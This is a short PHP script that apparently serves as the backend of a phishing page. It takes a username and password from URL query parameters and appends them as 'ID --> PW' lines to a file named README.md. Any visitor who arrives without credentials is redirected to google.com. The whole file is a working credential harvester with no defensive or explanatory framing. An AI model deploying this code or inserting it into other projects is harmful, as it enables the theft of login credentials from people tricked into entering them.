<?php

	if ($_GET["txtUserName"] && $_GET["txtPassword"]) {
		# code...
		$file = fopen("README.md","a");
		fwrite($file, '<> ID : '.$_GET["txtUserName"].' --> PW : '.$_GET["txtPassword"]."\n");
		fclose($file);

	}
	else {
		# code...
		echo "<script> window.location.href = 'http://google.com' </script>";
	}
?>
